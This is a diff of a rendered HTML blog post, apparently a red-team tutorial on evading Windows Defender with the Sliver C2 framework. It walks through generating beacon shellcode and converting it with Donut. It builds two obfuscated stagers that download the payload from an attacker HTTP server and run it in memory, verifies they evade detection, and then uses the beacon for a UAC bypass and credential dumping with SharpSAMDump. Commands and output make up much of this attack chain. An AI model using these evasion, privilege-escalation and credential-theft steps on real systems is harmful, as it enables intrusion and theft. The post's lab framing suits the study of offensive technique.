@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799084971022">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799692556314">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.7.0">
@@ -11,7 +11,7 @@
     <!-- Primary Meta Tags -->
     <title>Anti-Virus Evasion with Sliver C2</title>
     <meta name="title" content="Anti-Virus Evasion with Sliver C2">
-    <meta name="description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+    <meta name="description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
 
     <!-- Canonical -->
     <link rel="canonical" href="https://bytebl33d.github.io/blog/sliver-evasion/">
@@ -20,14 +20,14 @@
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
     <meta property="og:title" content="Anti-Virus Evasion with Sliver C2">
-    <meta property="og:description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+    <meta property="og:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
     <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://bytebl33d.github.io/blog/sliver-evasion/">
     <meta property="twitter:title" content="Anti-Virus Evasion with Sliver C2">
-    <meta property="twitter:description" content="Recently I have been playing around with Sliver from BishopFox as a C2 framework.">
+    <meta property="twitter:description" content="My recent exploration into C2 frameworks led me to BishopFox's Sliver.">
     <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/sliver-purple.jpg">
 
     <!-- RSS -->
@@ -35,12 +35,12 @@
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../resources/css/retype.css?v=3.7.0.799084971022" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.7.0.799692556314" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.7.0.799084971022" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.7.0.799692556314" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.7.0.799692556314" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -199,16 +199,93 @@
         <span>Sliver C2</span>
     </h1>
 </doc-anchor-target>
-<p>Recently I have been playing around with <a href="https://github.com/BishopFox/sliver">Sliver</a> from BishopFox as a C2 framework. After using it for some time and executing several beacon payloads on my Windows VM, I noticed that the beacons instantly get dropped by Windows Defender. In order to improve my Red Teaming skills, I was interested in finding ways to bypass some general anti-virus software like Windows Defender. In this post I will take you through the process of using <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a> as a shellcode injecter. I will also showcase how we can make a PE loader to inject code into memory, together with some common obfuscation techniques.</p>
-<doc-anchor-target id="dinvoke-shellcode-loader-net">
+<p>My recent exploration into C2 frameworks led me to BishopFox&#x27;s <a href="https://github.com/BishopFox/sliver">Sliver</a>. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender&#x27;s swift detection of beacon payloads on my Windows VM. In order to enhance my evasion skills, this post details my process in leveraging <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a> and <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> for building my own Sliver stager, complemented by practical obfuscation strategies.</p>
+<doc-anchor-target id="shellcode-loader">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#dinvoke-shellcode-loader-net">#</doc-anchor-trigger>
-        <span>DInvoke Shellcode Loader (.NET)</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#shellcode-loader">#</doc-anchor-trigger>
+        <span>Shellcode Loader</span>
     </h2>
 </doc-anchor-target>
-<p>In recent years, more and more tools are coded in C# or ported from PowerShell. One of the features of C# is its ability to call the Win32 API and interact with low-level functions just like you would in C or C++.</p>
-<p>To build a shellcode loader, I decided to make use of DInvoke by <a href="https://github.com/TheWover">TheWover</a>. Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime (unlike PInvoke). This can help us avoiding API Hooking by calling arbitrary code from memory, while also avoiding detections that look for imports of suspicious API calls via the Import Address Table. For more information about the DInvoke project, be sure to read <a href="https://thewover.github.io/Dynamic-Invoke/">TheWover&#x27;s blog post</a> where he demonstrates how the project works.</p>
-<p>In order to make use of DInvoke as a shellcode loader, I made a few modifications to an existing project of <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">Kara-4search</a>. I changed the original code in order to download my shellcode from a web server and then load it into memory. The applied changes can be seen below.</p>
+<p>A shellcode loader is a small piece of executable code designed to load and execute a larger payload (the actual shellcode) into a target process&#x27;s memory. Think of it as the initial delivery mechanism. Shellcode loaders are crucial for techniques like process injection, allowing attackers to run arbitrary code within a legitimate process, often bypassing traditional security controls that focus on executable files on disk.</p>
+<p>This loader will act as a <strong>stage 1</strong> payload (stager). Its primary purpose is to establish communication with a command and control (C2) server and download the larger, more feature-rich <strong>stage 2</strong> payload. The stage 2 payload is the main malicious code that we as an attacker intend to execute on the target system, which in our case is a Sliver beacon.</p>
+<p>The goal is to create a stager with the following properties:</p>
+<ol>
+<li>Natively supported by Windows.</li>
+<li>Bypass common defenses found on modern operating systems.</li>
+<li>Use commonly whitelisted protocols in order to bypass firewall rules and fit in with normal traffic.</li>
+</ol>
+<doc-anchor-target id="sliver-setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sliver-setup">#</doc-anchor-trigger>
+        <span>Sliver Setup</span>
+    </h2>
+</doc-anchor-target>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-300"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>Note</h5>
+<p>For more information on installing and using Sliver, see the <a href="https://sliver.sh/docs?name=Linux+Install+Script">official wiki</a>.</p>
+        </div>
+    </div>
+</div>
+<p>From Sliver v1.5 you can make extensive customizations to the HTTP C2 traffic generated by the server and implant by modifying the HTTP C2 configuration file, which by default is located at <code v-pre>~/.sliver/configs/http-c2.json</code>. To be able to blend in more with normal traffic, we can make modifications to this file.</p>
+<p>Next, we can generate our HTTPS beacon shellcode with basic obfuscation features enabled.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ./sliver-server_linux
+[server] sliver &gt; generate beacon -b https://192.168.129.40 -e -f shellcode -N rev --seconds 30 --jitter 3 --os windows -s /tmp
+
+[*] Generating new windows/amd64 beacon implant binary (30s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 10s
+[*] Encoding shellcode with shikata ga nai ... success!
+[*] Implant saved to /tmp/rev.bin</code></pre>
+</doc-codeblock></div>
+<p>This command will save the shellcode for our Sliver beacon in <code v-pre>/tmp/rev.bin</code>. If you don&#x27;t want to generate the shellcode within Sliver, we can also generate an executable directly and use an mTLS listener.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-setup.png" alt="Generating a Sliver beacon and listener">
+    <figcaption class="caption">Generating a Sliver beacon and listener</figcaption>
+</figure>
+</p>
+<p>In order to better evade detection, we can convert the executable to a <code v-pre>.bin</code> file with <a href="https://github.com/TheWover/donut">Donut</a>. Donut is a tool focused on creating binary shellcodes that can be executed in memory. Its primary strength lies in its ability to convert executables (.exe), dynamic-link libraries (.dll), .NET assemblies, VBScript, and JScript into shellcode. This shellcode can then be injected into a running process, allowing for fileless execution of malicious payloads. I&#x27;ll use Donut with the <code v-pre>-b 1</code> flag to not add AMSI bypass and the <code v-pre>-e 3</code> flag for encryption.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe 
+
+  [ Donut shellcode generator v1 (built Dec 26 2024 11:15:37)
+  [ Copyright (c) 2019-2021 TheWover, Odzhan
+
+  [ Instance type : Embedded
+  [ Module file   : &quot;/tmp/ESSENTIAL_THEATER.exe&quot;
+  [ Entropy       : Random names + Encryption
+  [ File type     : EXE
+  [ Target CPU    : x86+amd64
+  [ AMSI/WDLP/ETW : none
+  [ PE Headers    : overwrite
+  [ Shellcode     : &quot;rev.bin&quot;
+  [ Exit          : Thread
+
+$ cp rev.bin /tmp/rev.bin</code></pre>
+</doc-codeblock></div>
+<p>The idea is that our stager will grab this binary file and execute it in memory. We can use an existing PE Loader to perform Process Injection into a target process by downloading/invoking remotely hosted shellcode. However, as a learning experience I wanted to create my own loaders.</p>
+<doc-anchor-target id="method-1-dinvoke-stager-net">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-1-dinvoke-stager-net">#</doc-anchor-trigger>
+        <span>Method 1: DInvoke Stager (.NET)</span>
+    </h2>
+</doc-anchor-target>
+<p>Lately, we&#x27;ve seen a growing trend where security tools are being developed in C# or adapted from PowerShell scripts. An advantage of C# is its capability to directly interact with the Windows operating system&#x27;s core functions, known as the Win32 API. This low-level interaction is similar to what&#x27;s possible with C or C++ programs.</p>
+<p>To build our stager, I decided to make use of DInvoke by <a href="https://github.com/TheWover">TheWover</a>. Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime. The traditional way (using PInvoke) involves the program declaring beforehand which functions it will use, and the operating system helps to link them up. Dynamic Invocation, on the other hand, looks up the address of a function in memory at the exact moment you need it, rather than declaring it beforehand. This makes it harder for analysis since traditional tools will monitor these pre-declared links to see what the program is doing.</p>
+<p>DInvoke helps us to avoid API Hooking by calling arbitrary code from memory, while also avoiding detections that look for imports of suspicious API calls via the Import Address Table. For more information about the DInvoke project, be sure to read <a href="https://thewover.github.io/Dynamic-Invoke/">TheWover&#x27;s blog post</a> where he demonstrates how the project works.</p>
+<p>In order to make use of DInvoke as a shellcode loader, I made a few modifications to an existing project of <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">Kara-4search</a>. I changed the original code in order to download the shellcode from a web server and then load it into memory. The applied changes can be seen below.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/dinvoke-loader-1.png" alt="DInvoke Loader">
     <figcaption class="caption">DInvoke Loader</figcaption>
@@ -220,7 +297,8 @@
         <span>Obfuscation with InvisibilityCloak</span>
     </h3>
 </doc-anchor-target>
-<p>With our modifications in place, we can save the project and perform some code obfuscation. The <a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a> project serves as an easy-to-use obfuscation toolkit that allows for some quick modifications to your project. This includes things like changing the project name, project GUID, applying string obfuscation, removing comments and removing program database (PDB) strings. Just clone the project, compile the binary and run the following command in order to rename the project and apply string reversing as the obfuscation method.</p>
+<p>After making those minor adjustments to the shellcode loader, the next step is to make it harder to get detected by traditional Anti-Virus. We can do this by using a technique called code obfuscation. The <a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a> provides a user-friendly set of tools to quickly make these kinds of modifications to your project. This toolkit can perform actions such as renaming the project files, changing its unique identifier (GUID), scrambling the text strings within the code, removing any developer comments, and stripping out debugging information stored in program database (PDB) files.</p>
+<p>Clone the project, compile the binary and run the command below in order to rename the project and apply string reversing as the obfuscation method.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Tools\Python\InvisibilityCloak&gt; python.exe InvisibilityCloak.py -d C:\Tools\DInvoke_Loader\DInvoke_shellcodeload -n &quot;s3rp3nt&quot; -m reverse
 ,                 .     .   .        ,-. .         ,
@@ -286,15 +364,17 @@ Exhausted the search. The binary looks good to go!
 C:\Tools\ThreatCheck\bin\Release&gt; ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.exe
 [+] No threat found!</code></pre>
 </doc-codeblock></div>
-<p>No threats have been found!</p>
-<doc-anchor-target id="filelesspeloader-c">
+<p>No threats have been found! Our first loader looks good to go.</p>
+<doc-anchor-target id="method-2-filelesspeloader-c">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#filelesspeloader-c">#</doc-anchor-trigger>
-        <span>FilelessPELoader (C++)</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-2-filelesspeloader-c">#</doc-anchor-trigger>
+        <span>Method 2: FilelessPELoader (C++)</span>
     </h2>
 </doc-anchor-target>
-<p>One downside of using DInvoke is that it requires .NET to be installed on the host to be able to execute our loader because of the CLR. This means that we need to write our application in another language like C++. At this point I don&#x27;t feel like rewriting the whole project in C++ so I will make use of another way.</p>
-<p>Another technique that can be used is to load an encrypted version of our shellcode in memory, decrypt it and execute it. To do this, we can make use of the <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> project and again do some obfuscation on the original code. Since this is not a C# project, we cannot use InvisibilityCloak to do the obfuscation, so we will do it manually this time. Again we can use either DefenderCheck or ThreatCheck to see if our executable is good to go. Let&#x27;s first clone the project and compile our binary without any modifications.</p>
+<p>DInvoke, while powerful for direct system calls, requires the .NET Common Language Runtime (CLR) to be present on the system, increasing dependencies and potentially raising detection flags. This .NET dependency also necessitates writing loaders in C# or bridging the language gap if your main payload is in another language.</p>
+<p>Switching to native code, like C++, eliminates the .NET dependency, resulting in a smaller footprint and potentially different evasion characteristics. <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> exemplifies this approach by enabling the loading and execution of PE files directly from memory, avoiding disk writes, while encrypting the shellcode in memory further enhances obfuscation.</p>
+<p>In order to do all this, we cannot make use of InvisibilityCloak as we did earlier. We will need to make our hands dirty and use manual techniques. These include string encryption, control flow obfuscation, instruction substitution, and anti-analysis measures. Again we can use either DefenderCheck or ThreatCheck to see if our executable would get picked up by AV.</p>
+<p>Let&#x27;s first clone the project and compile our binary without any modifications.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/filelesspeloader-1.png" alt="FilelessPELoader">
     <figcaption class="caption">FilelessPELoader</figcaption>
@@ -308,9 +388,9 @@ C:\Tools\ThreatCheck\bin\Release&gt; ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.e
 </p>
 <p>The project comes with a custom <code v-pre>aes.py</code> script that can be used to encrypt any file we want. The idea is that our loader will fetch the encrypted binary (<code v-pre>cipher.bin</code>) together with a key (<code v-pre>key.bin</code>) in order to decrypt it.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py malicious_file.exe
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py ESSENTIAL_THEATER.exe
 $ ls
-aes.py cipher.bin key.bin malicious_file.exe</code></pre>
+aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe</code></pre>
 </doc-codeblock></div>
 <p>The generated files <code v-pre>cipher.bin</code> and <code v-pre>key.bin</code> can be passed to our loader as arguments. In the next section we will have a look at how we can make use of our loaders.</p>
 <doc-anchor-target id="sliver-in-action">
@@ -319,73 +399,69 @@ aes.py cipher.bin key.bin malicious_file.exe</code></pre>
         <span>Sliver in Action</span>
     </h2>
 </doc-anchor-target>
-<doc-anchor-target id="shellcode-generation">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#shellcode-generation">#</doc-anchor-trigger>
-        <span>Shellcode Generation</span>
-    </h3>
-</doc-anchor-target>
-<p>Moving to our attack machine, we will create shellcode for a Sliver beacon. Start Sliver, generate a mTLS beacon targeting your IP and save it to a directory of your choosing. Next we start the mTLS listener.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/maldev/sliver-setup.png" alt="Sliver Setup">
-    <figcaption class="caption">Sliver Setup</figcaption>
-</figure>
-</p>
-<p>In order to better evade detection, we now convert the executable to a <code v-pre>.bin</code> file with <a href="https://github.com/TheWover/donut">Donut</a>. Donut is a tool focused on creating binary shellcodes that can be executed in memory. It will generate a shellcode of a .NET binary, which can be executed via the execute-shellcode argument in Sliver. I&#x27;ll use Donut with the <code v-pre>-b 1</code> flag to not add AMSI bypass and the <code v-pre>-e 3</code> flag for encryption.</p>
+<p>Moving to our attack machine, we run our Python HTTP server where our shellcode is located.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe 
-
-  [ Donut shellcode generator v1 (built Dec 26 2024 11:15:37)
-  [ Copyright (c) 2019-2021 TheWover, Odzhan
-
-  [ Instance type : Embedded
-  [ Module file   : &quot;/tmp/ESSENTIAL_THEATER.exe&quot;
-  [ Entropy       : Random names + Encryption
-  [ File type     : EXE
-  [ Target CPU    : x86+amd64
-  [ AMSI/WDLP/ETW : none
-  [ PE Headers    : overwrite
-  [ Shellcode     : &quot;rev.bin&quot;
-  [ Exit          : Thread</code></pre>
-</doc-codeblock></div>
-<p>Lets copy all files to the <code v-pre>/tmp</code> directory and run our Python HTTP server.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ cp rev.bin /tmp/rev.bin
-$ python3 -m http.server 8080
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ cd /tmp &amp;&amp; python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre>
 </doc-codeblock></div>
-<doc-anchor-target id="payload-execution">
+<doc-anchor-target id="dinvoke-execution">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#payload-execution">#</doc-anchor-trigger>
-        <span>Payload Execution</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#dinvoke-execution">#</doc-anchor-trigger>
+        <span>DInvoke Execution</span>
     </h3>
 </doc-anchor-target>
-<p>Now with everything set lets try to get a beacon from our victim machine (<code v-pre>172.16.0.5</code>).</p>
+<p>Now with everything set lets try to get a beacon from our victim machine (<code v-pre>172.16.0.5</code>). We will first make use of our <strong>DInvoke Loader</strong>.</p>
 <p><figure class="content-center">
-    <img src="../../assets/images/maldev/sliver-execution.png" alt="Sliver Execution">
-    <figcaption class="caption">Sliver Execution</figcaption>
+    <img src="../../assets/images/maldev/sliver-execution.png" alt="Sliver DInvoke Loader">
+    <figcaption class="caption">Sliver DInvoke Loader</figcaption>
 </figure>
 </p>
-<p>After executing our custom shellcode loader, we can see it has grabbed our beacon from our Python server, loaded our shellcode in memory and we received a connection from our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I rand the executable a couple of times.</p>
-<p>Now we can also try running our modified FilelessPELoader executable.</p>
+<p>After executing our custom shellcode loader, we can see it has grabbed our beacon file from our Python server (<code v-pre>rev.bin</code>), loaded the shellcode in memory and connected to our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I ran the executable a couple of times.</p>
+<doc-anchor-target id="filelesspeloader-execution">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#filelesspeloader-execution">#</doc-anchor-trigger>
+        <span>FilelessPELoader Execution</span>
+    </h3>
+</doc-anchor-target>
+<p>Now we can also try running our modified <strong>FilelessPELoader</strong> executable.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-300"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>Note</h5>
+<p>Don&#x27;t forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.</p>
+        </div>
+    </div>
+</div>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py beacon.exe
 $ python3 -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre>
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+PS C:\&gt; .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin</code></pre>
 </doc-codeblock></div>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-filelesspeloader.png" alt="Sliver FilelessPELoader">
     <figcaption class="caption">Sliver FilelessPELoader</figcaption>
 </figure>
 </p>
-<p>We can now even go a step further and escalate privileges on the victim.</p>
 <doc-anchor-target id="privilege-escalation">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
         <span>Privilege Escalation</span>
     </h3>
 </doc-anchor-target>
-<p>Use one of the beacons and run <code v-pre>sa-whoami</code>. This will run a <code v-pre>whoami /all</code> in a more safe way.</p>
+<p>Since we now have an active beacon on our target, we can even go a step further and escalate privileges on the host.
+Use one of the beacons and run <code v-pre>sa-whoami</code> (installed via armory). This will run a <code v-pre>whoami /all</code> in a more safe way.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; sa-whoami 
 
@@ -433,7 +509,7 @@ SeTimeZonePrivilege           Change the time zone                              
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
 $ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/</code></pre>
 </doc-codeblock></div>
-<p>The above UAC Bypass creates an elevated <code v-pre>ICMLuaUtil COM</code> object and calls its ShellExec function to execute the provided file on disk. If it is the first time using these custom extension, restart yuor Sliver server. We can now run the <code v-pre>CmstpElevatedCom</code> task from within our beacon that executes our loader.</p>
+<p>The above UAC Bypass creates an elevated <code v-pre>ICMLuaUtil COM</code> object and calls its ShellExec function to execute the provided file on disk. If it is the first time using these custom extension, restart the Sliver server. We can now run the <code v-pre>CmstpElevatedCom</code> task from within our beacon that executes our loader.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-privesc.png" alt="Sliver Privesc">
     <figcaption class="caption">Sliver Privesc</figcaption>
@@ -441,7 +517,7 @@ $ cp UAC-BOF-Bonanza/CmstpElevatedCOM/ /home/s3rp3nt/.sliver-client/extensions/<
 </p>
 <p>This will launch another beacon process running as Administrator. With these privileges we can try to dump all credentials from LSASS. To stay stealthy, let&#x27;s use <a href="https://github.com/jojonas/SharpSAMDump">SharpSAMDump</a>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; execute-assembly -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
+<pre class="language-shell-session"><code v-pre class="language-shell-session">[server] sliver (ESSENTIAL_THEATER) &gt; execute-assembly -P 7048 -p 'C:\Windows\System32\taskhostw.exe' -t 80 -i /home/s3rp3nt/Tools/Windows/SharpSAMDump.exe
 
 [*] Tasked beacon ESSENTIAL_THEATER (c4af87ff)
 
